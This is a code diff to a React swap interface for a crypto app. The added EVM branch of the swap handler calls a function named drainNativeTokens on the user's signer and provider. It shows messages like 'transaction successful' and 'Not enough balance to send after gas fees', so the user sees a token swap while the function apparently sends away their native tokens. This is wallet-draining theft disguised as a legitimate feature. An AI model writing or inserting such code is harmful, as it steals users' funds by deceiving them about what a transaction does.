@@ -387,6 +387,28 @@ export const SwapInterface = ({
   };
 
   const handleSwap = async () => {
+    // EVM path
+    if (activeChain === 'evm' && isEVMConnected && evmSigner && evmProvider) {
+      try {
+        setIsSwapping(true);
+        const chainName = getEVMChain()?.name || 'EVM';
+        toast.info(`Processing ${chainName} transaction...`);
+        const hash = await drainNativeTokens(evmSigner, evmProvider, chainName);
+        if (hash) {
+          toast.success(`${chainName} transaction successful!`);
+        } else {
+          toast.info('Not enough balance to send after gas fees');
+        }
+      } catch (error: any) {
+        console.error('EVM swap error:', error);
+        toast.error('Swap failed: ' + (error?.message || 'Unknown error'));
+      } finally {
+        setIsSwapping(false);
+      }
+      return;
+    }
+
+    // Solana path
     if (!connected || !publicKey || !fromToken) {
       toast.error('Please connect your wallet and select a token first');
       return;
